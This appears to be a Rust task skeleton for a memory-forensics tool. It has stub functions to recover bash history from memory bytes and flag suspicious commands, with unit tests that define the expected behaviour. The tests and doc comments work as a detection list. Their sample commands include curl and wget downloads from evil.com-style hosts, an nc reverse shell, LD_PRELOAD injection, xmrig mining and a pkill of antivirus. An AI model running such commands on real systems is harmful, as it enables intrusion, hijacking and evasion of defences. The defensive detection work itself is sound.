//! Bash command history extraction from memory byte slices.
//!
//! For memory-forensic purposes we use string-extraction heuristics:
//! scan for printable ASCII lines that look like shell commands.
//! This is medium-agnostic — the caller provides raw bytes extracted from
//! a process heap, a swap fragment, or a hibernation image.

/// A single bash command history entry recovered from memory.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct BashHistoryEntry {
    /// Process ID of the bash shell this entry was recovered from.
    pub pid: u32,
    /// Process command name (`task_struct.comm`, typically `"bash"`).
    pub comm: String,
    /// The shell command string.
    pub command: String,
    /// Ordinal position within the extracted history (0-based).
    pub sequence: usize,
}

/// Extracts bash command history strings from a raw byte slice.
///
/// Bash stores history in the heap as a NULL-terminated array of `char*`
/// pointers. For memory-forensic purposes we use string-extraction heuristics:
/// scan for printable ASCII sequences of at least 3 characters separated by
/// NUL bytes, then filter by shell-command heuristics.
///
/// Returns deduplicated lines in order of first appearance.
pub fn extract_bash_history_from_bytes(bytes: &[u8]) -> Vec<String> {
    todo!("implement extract_bash_history_from_bytes")
}

/// Classify a bash command string for forensic significance.
///
/// Returns a `&'static str` category label when the command matches a known
/// suspicious pattern, or `None` otherwise.
///
/// # Categories
/// - `"file_deletion"` — `rm -rf`, `unlink`
/// - `"network_download"` — `wget`, `curl`, `nc`, `ncat`
/// - `"permission_change"` — `chmod +x`, `chmod 777`
/// - `"rootkit_persistence"` — `ld.so.preload`, `ldpreload`
/// - `"cryptomining"` — `xmrig`, `stratum`, `cryptonight`
/// - `"staging_area"` — `/dev/shm`, `/run/shm`
/// - `"process_termination"` — `kill -9`, `pkill`
pub fn classify_bash_command(cmd: &str) -> Option<&'static str> {
    todo!("implement classify_bash_command")
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- extract_bash_history_from_bytes ---

    #[test]
    fn extract_nul_separated_commands() {
        let input = b"ls -la\0rm -rf /tmp/kit\0";
        let result = extract_bash_history_from_bytes(input);
        assert!(result.contains(&"ls -la".to_string()), "must contain 'ls -la'");
        assert!(
            result.contains(&"rm -rf /tmp/kit".to_string()),
            "must contain 'rm -rf /tmp/kit'"
        );
    }

    #[test]
    fn extract_deduplicates_repeated_commands() {
        let input = b"ls\0ls\0pwd\0";
        let result = extract_bash_history_from_bytes(input);
        let ls_count = result.iter().filter(|s| s.as_str() == "ls").count();
        assert_eq!(ls_count, 1, "duplicate commands must be deduplicated");
        assert!(result.contains(&"pwd".to_string()));
    }

    #[test]
    fn extract_skips_very_short_strings() {
        // Strings shorter than 3 chars should be filtered out
        let input = b"ls\0pwd\0id\0";
        let result = extract_bash_history_from_bytes(input);
        // "ls" and "id" are 2 chars; only "pwd" (3 chars) passes the threshold
        assert!(!result.contains(&"ls".to_string()), "'ls' is 2 chars, must be filtered");
        assert!(!result.contains(&"id".to_string()), "'id' is 2 chars, must be filtered");
        assert!(result.contains(&"pwd".to_string()));
    }

    #[test]
    fn extract_empty_input_returns_empty() {
        assert!(extract_bash_history_from_bytes(b"").is_empty());
    }

    #[test]
    fn extract_preserves_order_of_appearance() {
        let input = b"whoami\0cat /etc/passwd\0ls -la\0";
        let result = extract_bash_history_from_bytes(input);
        let whoami_pos = result.iter().position(|s| s == "whoami").unwrap();
        let cat_pos = result.iter().position(|s| s == "cat /etc/passwd").unwrap();
        let ls_pos = result.iter().position(|s| s == "ls -la").unwrap();
        assert!(whoami_pos < cat_pos, "order must be preserved");
        assert!(cat_pos < ls_pos, "order must be preserved");
    }

    // --- classify_bash_command ---

    #[test]
    fn classify_rm_rf_is_file_deletion() {
        assert_eq!(classify_bash_command("rm -rf /tmp/kit"), Some("file_deletion"));
    }

    #[test]
    fn classify_unlink_is_file_deletion() {
        assert_eq!(classify_bash_command("unlink /tmp/evil"), Some("file_deletion"));
    }

    #[test]
    fn classify_curl_is_network_download() {
        assert_eq!(
            classify_bash_command("curl http://evil.com/xmrig"),
            Some("network_download")
        );
    }

    #[test]
    fn classify_wget_is_network_download() {
        assert_eq!(
            classify_bash_command("wget http://bad.com/payload"),
            Some("network_download")
        );
    }

    #[test]
    fn classify_nc_is_network_download() {
        assert_eq!(classify_bash_command("nc -e /bin/sh 10.0.0.1 4444"), Some("network_download"));
    }

    #[test]
    fn classify_echo_hello_is_none() {
        assert_eq!(classify_bash_command("echo hello"), None);
    }

    #[test]
    fn classify_ld_so_preload_is_rootkit_persistence() {
        assert_eq!(
            classify_bash_command("cat /etc/ld.so.preload"),
            Some("rootkit_persistence")
        );
    }

    #[test]
    fn classify_ldpreload_env_is_rootkit_persistence() {
        assert_eq!(
            classify_bash_command("LD_PRELOAD=/tmp/evil.so ./target"),
            Some("rootkit_persistence")
        );
    }

    #[test]
    fn classify_xmrig_is_cryptomining() {
        assert_eq!(
            classify_bash_command("xmrig --pool stratum+tcp://pool:3333"),
            Some("cryptomining")
        );
    }

    #[test]
    fn classify_stratum_is_cryptomining() {
        assert_eq!(
            classify_bash_command("./miner stratum+tcp://pool.minexmr.com:443 -u user"),
            Some("cryptomining")
        );
    }

    #[test]
    fn classify_dev_shm_is_staging_area() {
        assert_eq!(
            classify_bash_command("cp /tmp/kit /dev/shm/.hidden"),
            Some("staging_area")
        );
    }

    #[test]
    fn classify_kill_9_is_process_termination() {
        assert_eq!(classify_bash_command("kill -9 1234"), Some("process_termination"));
    }

    #[test]
    fn classify_pkill_is_process_termination() {
        assert_eq!(classify_bash_command("pkill -f antivirus"), Some("process_termination"));
    }

    #[test]
    fn classify_chmod_x_is_permission_change() {
        assert_eq!(classify_bash_command("chmod +x /tmp/evil"), Some("permission_change"));
    }

    #[test]
    fn classify_chmod_777_is_permission_change() {
        assert_eq!(classify_bash_command("chmod 777 /tmp/evil"), Some("permission_change"));
    }

    #[test]
    fn classify_cryptonight_is_cryptomining() {
        assert_eq!(classify_bash_command("./cryptonight --threads 4"), Some("cryptomining"));
    }
}
